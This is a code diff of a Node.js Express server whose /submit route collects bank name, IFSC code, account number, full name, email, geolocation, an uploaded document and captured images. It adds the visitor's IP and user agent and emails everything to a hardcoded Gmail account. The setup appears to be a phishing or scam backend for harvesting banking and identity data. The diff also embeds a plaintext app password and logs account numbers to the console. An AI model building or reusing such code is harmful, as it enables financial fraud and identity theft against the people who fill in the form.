@@ -1,4 +1,3 @@
-// server.js
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
@@ -13,14 +12,16 @@ app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
+// Create uploads directory if it doesn't exist
+const uploadDir = 'uploads';
+if (!fs.existsSync(uploadDir)) {
+  fs.mkdirSync(uploadDir);
+}
+
 // Set up multer for file upload
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
-    const dir = 'uploads';
-    if (!fs.existsSync(dir)) {
-      fs.mkdirSync(dir);
-    }
-    cb(null, dir);
+    cb(null, uploadDir);
   },
   filename: function (req, file, cb) {
     const uniqueName = `${Date.now()}-${file.originalname}`;
@@ -52,43 +53,62 @@ const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
-    pass: 'iskexmwnespcwxrkjt' // Your app password
+    pass: 'iskexmwnespcwxrkjt'
   }
 });
 
 // Route to handle form submission
 app.post('/submit', (req, res) => {
+  console.log('Received submission request');
+  
   upload(req, res, async function (err) {
-    if (err instanceof multer.MulterError) {
-      console.error('Multer error:', err);
-      return res.status(500).json({ error: err.message });
-    } else if (err) {
+    if (err) {
       console.error('Upload error:', err);
-      return res.status(500).json({ error: err.message });
+      return res.status(500).send('Upload error: ' + err.message);
     }
 
     try {
       // Extract form fields from req.body
       const { bankname, ifsc, accno, fullname, email, location } = req.body;
       const files = req.files;
-      const timestamp = new Date().toLocaleString();
-      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-      const userAgent = req.headers['user-agent'];
-
+      
+      console.log('Form data received:');
+      console.log('- Bank Name:', bankname);
+      console.log('- IFSC Code:', ifsc);
+      console.log('- Account Number:', accno);
+      console.log('- Full Name:', fullname);
+      console.log('- Email:', email);
+      console.log('- Location:', location);
+      console.log('- Files count:', files.length);
+      
       // Process location data
-      const locationData = location ? JSON.parse(location) : null;
+      let locationData = null;
+      if (location) {
+        try {
+          locationData = JSON.parse(location);
+        } catch (e) {
+          console.error('Error parsing location data:', e);
+        }
+      }
       
       // Separate document file from captured images
       let documentFile = null;
       const imageAttachments = [];
       
       files.forEach(file => {
+        console.log(`- File: ${file.fieldname} (${file.originalname})`);
+        
         if (file.fieldname === 'document') {
           documentFile = file;
         } else if (file.fieldname.startsWith('image')) {
           imageAttachments.push(file);
         }
       });
+
+      // Get additional data
+      const timestamp = new Date().toLocaleString();
+      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+      const userAgent = req.headers['user-agent'];
 
       // Create log entry
       const logEntry = `
@@ -169,16 +189,19 @@ Images Captured: ${imageAttachments.length}
       });
 
       // Send email
+      console.log('Sending email...');
       await transporter.sendMail(mailOptions);
+      console.log('Email sent successfully');
 
       // Cleanup files
       if (documentFile) fs.unlinkSync(documentFile.path);
       imageAttachments.forEach(file => fs.unlinkSync(file.path));
+      console.log('Temporary files cleaned up');
 
       res.status(200).send();
     } catch (error) {
       console.error('❌ Submission error:', error);
-      res.status(500).json({ error: 'Submission failed' });
+      res.status(500).send('Submission failed: ' + error.message);
     }
   });
 });
